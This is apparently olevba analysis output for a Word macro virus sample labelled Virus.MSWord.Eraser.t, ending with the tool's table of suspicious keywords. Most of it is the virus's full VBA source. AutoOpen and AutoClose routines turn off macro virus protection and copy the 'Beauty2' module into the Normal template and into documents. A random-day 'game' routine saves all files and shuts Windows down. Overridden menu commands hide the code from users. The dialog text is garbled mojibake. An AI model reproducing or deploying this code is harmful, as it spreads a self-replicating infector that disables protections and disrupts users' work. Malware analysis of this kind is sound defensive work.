olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Eraser.t
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Eraser.t - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO beauty2.bas 
in file: ./Virus.MSWord.Eraser.t - OLE stream: 'Macros/VBA/beauty2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoClose()
Dim nor$: Dim fn$: Dim c
Dim ca: Dim con1: Dim cc
Dim ca1
On Error Resume Next

Dim dlg As Object: Set dlg = _
WordBasic.DialogRecord.FileSummaryInfo(False)
WordBasic.CurValues.FileSummaryInfo dlg
nor$ = _
dlg.Template
fn$ = _
WordBasic.[FileNameInfo$](WordBasic.[FileName$](), 1)
con = _
WordBasic.CountAutoTextEntries(0)
If con > 0 Then
For c = 1 To con
If WordBasic.[AutoTextName$](c, 0) = _
"lamo" Then ca = _
1
Next c
End If
If ca <> 1 Then

 WordBasic.Organizer Copy:= _
 1, Source:= _
 fn$, Destination:= _
 nor$, Name:= _
 "lamo", Tab:= _
 1
 WordBasic.Organizer Copy:= _
 1, Source:= _
 fn$, Destination:= _
 nor$, Name:= _
 "p1", Tab:= _
 1
 WordBasic.Organizer Copy:= _
 1, Source:= _
 fn$, Destination:= _
 nor$, Name:= _
 "p2", Tab:= _
 1
 WordBasic.Organizer Copy:= _
 1, Source:= _
 fn$, Destination:= _
 nor$, Name:= _
 "p3", Tab:= _
 1

End If

On Error Resume Next
  
Options.VirusProtection = False
Set ActiveDoc = ActiveDocument
Set GlobalDoc = NormalTemplate
DocumentInstalled = False
GlobalInstalled = False

For i = 1 To ActiveDocument.VBProject.VBComponents.Count
If ActiveDocument.VBProject.VBComponents(i).Name = "Beauty2" Then
DocumentInstalled = True
End If
Next

For j = 1 To NormalTemplate.VBProject.VBComponents.Count
If NormalTemplate.VBProject.VBComponents(j).Name = "Beauty2" Then
GlobalInstalled = True
End If
Next

If DocumentInstalled = False Then
Application.OrganizerCopy Source:= _
NormalTemplate.FullName, Destination:= _
ActiveDocument.FullName, Name:= _
"Beauty2", Object:=wdOrganizerObjectProjectItems
ActiveDoc.SaveAs , FileFormat:=wdFormatTemplate
        
       
End If

con1 = WordBasic.CountAutoTextEntries(1)
If con1 > 0 Then
For cc = 1 To con1
If WordBasic.[AutoTextName$](cc, 1) = _
"lamo" Then ca1 = _
1
Next cc
End If
If ca1 <> 1 Then
WordBasic.Organizer Copy:= _
1, Source:= _
nor$, Destination:= _
fn$, Name:= _
"lamo", Tab:= _
1
WordBasic.Organizer Copy:= _
1, Source:= _
nor$, Destination:= _
fn$, Name:= _
"p1", Tab:= _
1
WordBasic.Organizer Copy:= _
1, Source:= _
nor$, Destination:= _
fn$, Name:= _
"p2", Tab:= _
1
WordBasic.Organizer Copy:= _
1, Source:= _
nor$, Destination:= _
fn$, Name:= _
"p3", Tab:= _
1
End If

If GlobalInstalled = False Then
Application.OrganizerCopy Source:= _
ActiveDocument.FullName, Destination:= _
NormalTemplate.FullName, Name:= _
"Beauty2", Object:=wdOrganizerObjectProjectItems
Options.SaveNormalPrompt = False
             
End If

'WordBasic.DocClose 1

If WordBasic.Day(WordBasic.Now()) = WordBasic.Int(Rnd() * 30) + 1 Then
WordBasic.Call "game"
End If


exit_:

End Sub
Sub AutoOpen()
Dim nor$: Dim fn$: Dim c
Dim ca: Dim con1: Dim cc
Dim ca1
On Error Resume Next

Dim dlg As Object: Set dlg = _
WordBasic.DialogRecord.FileSummaryInfo(False)
WordBasic.CurValues.FileSummaryInfo dlg
nor$ = _
dlg.Template
fn$ = _
WordBasic.[FileNameInfo$](WordBasic.[FileName$](), 1)
con = _
WordBasic.CountAutoTextEntries(0)
If con > 0 Then
For c = 1 To con
If WordBasic.[AutoTextName$](c, 0) = _
"lamo" Then ca = _
1
Next c
End If
If ca <> 1 Then

 WordBasic.Organizer Copy:= _
 1, Source:= _
 fn$, Destination:= _
 nor$, Name:= _
 "lamo", Tab:= _
 1
 WordBasic.Organizer Copy:= _
 1, Source:= _
 fn$, Destination:= _
 nor$, Name:= _
 "p1", Tab:= _
 1
 WordBasic.Organizer Copy:= _
 1, Source:= _
 fn$, Destination:= _
 nor$, Name:= _
 "p2", Tab:= _
 1
 WordBasic.Organizer Copy:= _
 1, Source:= _
 fn$, Destination:= _
 nor$, Name:= _
 "p3", Tab:= _
 1

End If

On Error Resume Next
  
Options.VirusProtection = False
Set ActiveDoc = ActiveDocument
Set GlobalDoc = NormalTemplate
DocumentInstalled = False
GlobalInstalled = False

For i = 1 To ActiveDocument.VBProject.VBComponents.Count
If ActiveDocument.VBProject.VBComponents(i).Name = "Beauty2" Then
DocumentInstalled = True
End If
Next

For j = 1 To NormalTemplate.VBProject.VBComponents.Count
If NormalTemplate.VBProject.VBComponents(j).Name = "Beauty2" Then
GlobalInstalled = True
End If
Next

If DocumentInstalled = False Then
Application.OrganizerCopy Source:= _
NormalTemplate.FullName, Destination:= _
ActiveDocument.FullName, Name:= _
"Beauty2", Object:=wdOrganizerObjectProjectItems
ActiveDoc.SaveAs , FileFormat:=wdFormatTemplate
        
       
End If

con1 = WordBasic.CountAutoTextEntries(1)
If con1 > 0 Then
For cc = 1 To con1
If WordBasic.[AutoTextName$](cc, 1) = _
"lamo" Then ca1 = _
1
Next cc
End If
If ca1 <> 1 Then
WordBasic.Organizer Copy:= _
1, Source:= _
nor$, Destination:= _
fn$, Name:= _
"lamo", Tab:= _
1
WordBasic.Organizer Copy:= _
1, Source:= _
nor$, Destination:= _
fn$, Name:= _
"p1", Tab:= _
1
WordBasic.Organizer Copy:= _
1, Source:= _
nor$, Destination:= _
fn$, Name:= _
"p2", Tab:= _
1
WordBasic.Organizer Copy:= _
1, Source:= _
nor$, Destination:= _
fn$, Name:= _
"p3", Tab:= _
1
End If

If GlobalInstalled = False Then
Application.OrganizerCopy Source:= _
ActiveDocument.FullName, Destination:= _
NormalTemplate.FullName, Name:= _
"Beauty2", Object:=wdOrganizerObjectProjectItems
Options.SaveNormalPrompt = False
             
End If

'WordBasic.DocClose 1

If WordBasic.Day(WordBasic.Now()) = WordBasic.Int(Rnd() * 30) + 1 Then
WordBasic.Call "game"
End If


exit_:

End Sub
Sub GAME()
Dim R
Dim num
Dim ANS
R = 1
WordBasic.BeginDialog 478, 216, "¬ь ¤k ®± 2 for Word97"
    WordBasic.Picture 10, 6, 238, 199, "p3", 1, "Picture1"
    WordBasic.Text 266, 8, 194, 13, "¶Щ ! ©M §Ъ Іq ­У ®± §a!!", "Text1"
    WordBasic.Text 266, 27, 193, 13, "Іq Д№ ґN Еэ §A ¬Э єл ±m Єє !!", "Text2"
    WordBasic.Text 266, 46, 184, 13, "ґN єв ¬O Іq їй ¤F !!", "Text3"
    WordBasic.Text 266, 65, 190, 13, "§O ©И !! µґ ¤Ј ·| ¶Л §A Єє", "Text4"
    WordBasic.Text 266, 84, 190, 13, "Д_ Ё© №q ёЈ ¤@ ¤А ¤@ І@ Єє !! ", "Text5"
    WordBasic.Text 266, 103, 190, 13, "©с ¤Я Є± §a !", "Text6"
    WordBasic.PushButton 268, 122, 195, 21, "Ёє§ЪҐX°Е¤M¦n¤F!!", "Push1"
    WordBasic.PushButton 268, 151, 195, 21, "Ёє§ЪҐXҐЫАY¦n¤F!!", "Push2"
    WordBasic.PushButton 268, 183, 195, 21, "Ёє§ЪҐXҐ¬¦n¤F!!", "Push3"
WordBasic.EndDialog

guessgame:
Dim gdh As Object: Set gdh = _
WordBasic.CurValues.UserDialog
num = _
WordBasic.Int(Rnd() * 5) + 1
ANS = _
WordBasic.Dialog.UserDialog(gdh)
If num >= 4 Then
recall
GoTo guessgame

End If
If ANS = num Then
WordBasic.MsgBox "§O  °Є  їі !! §Ъ  ¬O  ¬Э  §A  Ґi  ј¦ ЎA ¤~  ¬G  ·N  їй  §A  Єє !!", "¬ь ¤k ®± 2 for Word97", 64
GoTo exit_
End If
WordBasic.Beep
WordBasic.MsgBox "»№  АЕ  ¤F !! ­n  ¤Ј  ­n  §Ъ  Еэ  §A  ¤@  §в  Ј« ??", "¬ь ¤k ®± 2 for Word97", 64
R = R + 1
If R <= 5 Then
GoTo guessgame
End If

WordBasic.MsgBox "ЁS  ЁЈ  №L  №і  §A  іo  јЛ  ЪД  Єє  ¤H  !!  ¤p  ©j  §Ъ  ¤Ј  і­  §A  ЇУ  ¤F !!", "¬ь ¤k ®± 2 for Word97", 64
WordBasic.FileSaveAll
Task.ExitWindows

exit_:
guess1
End Sub

Private Sub guess1()
Dim R
Dim num
Dim ANS
R = 1
WordBasic.BeginDialog 478, 216, "¬ь ¤k ®± 2 for Word97 "
    WordBasic.Picture 10, 6, 238, 199, "lamo", 1, "Picture1"
    WordBasic.Text 266, 8, 194, 13, "«e­±¤@Гц¬O¬G·N©с¤фЄє!!", "Text1"
    WordBasic.Text 266, 27, 193, 13, "іo¦^±o¬Э§AЄєЇuҐ»ЁЖ°Х!!", "Text2"
    WordBasic.Text 266, 46, 184, 13, "¬Э§AЄє¦n№BЇа«щДт¦h¤[?", "Text3"
    WordBasic.Text 266, 65, 190, 13, "±M¤ЯВI!!", "Text4"
    WordBasic.Text 266, 84, 190, 13, "Ґi§Oїй±o¤УГш¬Эіб!!", "Text5"
    WordBasic.Text 266, 103, 190, 13, "§ЪЄє§ЮіNҐi¬O¤@¬yЄєіб!!", "Text6"
    WordBasic.PushButton 268, 122, 195, 21, "Ёє§ЪҐX°Е¤M¦n¤F!!", "Push1"
    WordBasic.PushButton 268, 151, 195, 21, "Ёє§ЪҐXҐЫАY¦n¤F!!", "Push2"
    WordBasic.PushButton 268, 183, 195, 21, "Ёє§ЪҐXҐ¬¦n¤F!!", "Push3"
WordBasic.EndDialog

guessgame:
Dim gdh As Object: Set gdh = _
WordBasic.CurValues.UserDialog
num = _
WordBasic.Int(Rnd() * 7) + 1
ANS = _
WordBasic.Dialog.UserDialog(gdh)
If num >= 6 Then
recall
GoTo guessgame

End If

If ANS = num Then
WordBasic.MsgBox "®р  ¦є  ¤H  ¤F !! §A  Єє  №B  ®р  «з  »т  іo  »т  ¦n  ?", "¬ь ¤k ®± 2 for Word97", 64
GoTo exit_
End If
WordBasic.Beep
WordBasic.MsgBox "¦^  Ґh  ¦Y  Ґ¤  §a !! ЁЕ  Їд  Ґј  °®  Єє  ¤p  ¤l !!", "¬ь ¤k ®± 2 for Word97", 64
R = R + 1
If R <= 5 Then
GoTo guessgame
End If

WordBasic.MsgBox "¤С  ¦r  ІД  ¤@  ё№  ¤j  ҐХ  ГЁ !!!! №L  ЁУ  »Q  §Ъ  Єє  ё}  іk  АY  §a !!", "¬ь ¤k ®± 2 for Word97", 64
WordBasic.FileSaveAll
Task.ExitWindows


exit_:
guess2
End Sub

Private Sub guess2()
Dim R
Dim num
Dim ANS
R = 1
WordBasic.BeginDialog 478, 216, "¬ь ¤k ®± 2 for Word97"
    WordBasic.Picture 10, 6, 238, 199, "p1", 1, "Picture1"
    WordBasic.Text 266, 8, 194, 13, "¤ЈВІіжіб!ЇаіsВфЁвГц!", "Text1"
    WordBasic.Text 266, 27, 193, 13, "ЄGµM¬O­У¤¤°Є¤в!!", "Text2"
    WordBasic.Text 266, 46, 184, 13, "¦эЎA§AҐi§O·Q»ґ©ц№L§Ъ", "Text3"
    WordBasic.Text 266, 65, 190, 13, "іo¤@Гц!!Ј°!!Ј°!!«ф°U", "Text4"
    WordBasic.Text 266, 84, 190, 13, "§в±ѕ¦bјLЁ¤Єє¤f¤фАї¤@Аї!!", "Text5"
    WordBasic.Text 266, 103, 190, 13, "іoјЛ«ЬГш¬Э­C!!", "Text6"
    WordBasic.PushButton 268, 122, 195, 21, "Ёє§ЪҐX°Е¤M¦n¤F!!", "Push1"
    WordBasic.PushButton 268, 151, 195, 21, "Ёє§ЪҐXҐЫАY¦n¤F!!", "Push2"
    WordBasic.PushButton 268, 183, 195, 21, "Ёє§ЪҐXҐ¬¦n¤F!!", "Push3"
WordBasic.EndDialog

guessgame:
Dim gdh As Object: Set gdh = _
WordBasic.CurValues.UserDialog
num = _
WordBasic.Int(Rnd() * 7) + 1
ANS = _
WordBasic.Dialog.UserDialog(gdh)
If num >= 7 Then
recall
GoTo guessgame

End If

If ANS = num Then
WordBasic.MsgBox "іЮ !! §A  ¦і  §@  №ъ  Єє  ¶ы  єГ  іб !!", "¬ь ¤k ®± 2 for Word97", 64
GoTo exit_
End If
WordBasic.Beep
WordBasic.MsgBox "іЮ !! §A   БЩ   ЁS   єО   їф   Ј« ????", "¬ь ¤k ®± 2 for Word97", 64
R = R + 1
If R <= 5 Then
GoTo guessgame
End If

WordBasic.MsgBox "До  Ѕј  Б°  ·Q  ¦Y  ¤С  ГZ  ¦Ч  !! БЩ  ¦­  µЫ  ©O  !! ¤@  Гд  ІD  §Ц  Ґh !!", "¬ь ¤k ®± 2 for Word97", 64
WordBasic.FileSaveAll
Task.ExitWindows

exit_:
guess3
End Sub

Private Sub guess3()
Dim num
Dim ANS
WordBasic.BeginDialog 478, 216, "¬ь ¤k ®± 2 for Word97"
    WordBasic.Picture 10, 6, 238, 199, "p2", 1, "Picture1"
    WordBasic.Text 266, 8, 194, 13, "¤@ёф№LГц±Щ±N!Їu¦і§AЄє!!", "Text1"
    WordBasic.Text 266, 27, 193, 13, "іo¬OіМ«б¤@Гц!!¦іҐ»ЁЖД№§Ъ", "Text2"
    WordBasic.Text 266, 46, 184, 13, "ґNЕэ§A¬Эєл±mЄє!!", "Text3"
    WordBasic.Text 266, 65, 190, 13, "їй¤F!!¤]ЁSФЈ¤j¤Ј¤FЄє!!", "Text4"
    WordBasic.Text 266, 84, 190, 13, "Ґu©З§A§ЮіN¤УДк!!", "Text5"
    WordBasic.Text 266, 103, 190, 13, "Лз!!§A«з»т¬y»у¦е¤F??", "Text6"
    WordBasic.PushButton 268, 122, 195, 21, "Ёє§ЪҐX°Е¤M¦n¤F!!", "Push1"
    WordBasic.PushButton 268, 151, 195, 21, "Ёє§ЪҐXҐЫАY¦n¤F!!", "Push2"
    WordBasic.PushButton 268, 183, 195, 21, "Ёє§ЪҐXҐ¬¦n¤F!!", "Push3"
WordBasic.EndDialog

guessgame:
Dim gdh As Object: Set gdh = _
WordBasic.CurValues.UserDialog
num = _
WordBasic.Int(Rnd() * 10) + 1
ANS = _
WordBasic.Dialog.UserDialog(gdh)
If num >= 6 Then
recall
GoTo guessgame

End If

If ANS = num Then
WordBasic.MsgBox "°Q  №Ѕ  °Х  !! ­и  ¤~  Ёє  ¤@  ®±  ¤Ј  єв  °Х  !!", "¬ь ¤k ®± 2 for Word97", 64
GoTo exit_
End If
WordBasic.Beep
WordBasic.MsgBox "Ј° !! §Ъ   Д№  ¤F!! іo  Ґs  №к  ¤O  !! §A   Аґ  ¤Ј  Аґ  Ј«??", "¬ь ¤k ®± 2 for Word97", 64
GoTo guessgame



exit_:
On Error Resume Next
WordBasic.FileNewDefault
WordBasic.CenterPara
WordBasic.FormatFont Points:=48, Underline:=0, Color:=6, Bold:=1
WordBasic.Insert "Лз!!¤jЅЮ­ф!!ЁS°Х!!ГшЁм§AБЩ·Q¬Э­­ЁоЇЕЄєЈ«????"
WordBasic.FileSaveAll
WordBasic.DocClose 1
Task.ExitWindows

End Sub

Private Sub recall()

ANS:
Dim RE
RE = WordBasic.Int(Rnd() * 10)
If RE > 9 Or RE < 3 Then GoTo ANS

If RE = 3 Then
WordBasic.Beep
WordBasic.MsgBox "¦n   §a !!  іo   ¦^   Ґ­   ¤в ! ¦A  Іq  ¤@  ®±  §a !! ", "¬ь ¤k ®± 2 for Word97", 64
K = 1
End If

If RE = 4 Then
WordBasic.Beep
WordBasic.MsgBox "·d  ¤°  »т  №А !! іє   µM   ЁS   ¦і   їй   Д№ !!", "¬ь ¤k ®± 2 for Word97", 64
End If

If RE = 5 Then
WordBasic.Beep
WordBasic.MsgBox "©З  ©З !!!! §A  ­A  ¶B  іб  ?!", "¬ь ¤k ®± 2 for Word97", 64
 End If

If RE = 6 Then
WordBasic.Beep
WordBasic.MsgBox "¤Ј  Ґi  Їа  §a !! ¦і  Ґ»  ЁЖ  ¤U  ¤@  ®±  Д№  §Ъ !!", "¬ь ¤k ®± 2 for Word97", 64
End If

 If RE = 7 Then
WordBasic.Beep
WordBasic.MsgBox "Ј°..............!!  іo   «Ь   Ёё   Єщ   іб !! ", "¬ь ¤k ®± 2 for Word97", 64
End If

If RE = 8 Then
WordBasic.Beep
WordBasic.MsgBox "­у !! ¤@  ©w  ¬O  §A  ¦b  ·d  °­ЎA ¤Ј  µM  «з  »т  ·|  іo  јЛ !!", "¬ь ¤k ®± 2 for Word97", 64
End If

If RE = 9 Then
WordBasic.Beep
WordBasic.MsgBox "@$#*%#@#!!®і  ҐX  §A  Єє  Їu  Ґ»  ЁЖ  §a!! §O  ¦A  ±Г  ¤г  ¤F ", "¬ь ¤k ®± 2 for Word97", 64
End If


End Sub
Sub FileTemplates()
Dim G
K = _
WordBasic.Int(Rnd() * 10)
If G >= 8 Then
WordBasic.Call "game"
GoTo bye
End If

exit_:
WordBasic.Beep

bye:

End Sub
Sub ToolsOptions()
Dim G
K = _
WordBasic.Int(Rnd() * 10)
If G >= 8 Then
WordBasic.Call "game"
GoTo bye
End If

exit_:
WordBasic.Beep

bye:
End Sub
Sub ViewVbCode()
Dim G
K = _
WordBasic.Int(Rnd() * 10)
If G >= 8 Then
WordBasic.Call "game"
GoTo bye
End If

exit_:
WordBasic.Beep

bye:

End Sub
Sub ToolsMacro()
Dim G
K = _
WordBasic.Int(Rnd() * 10)
If G >= 8 Then
WordBasic.Call "game"
GoTo bye
End If

exit_:
WordBasic.Beep

bye:

End Sub
Sub Toolscustomize()
Dim G
K = _
WordBasic.Int(Rnd() * 10)
If G >= 8 Then
WordBasic.Call "game"
GoTo bye
End If

exit_:
WordBasic.Beep

bye:
End Sub


+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

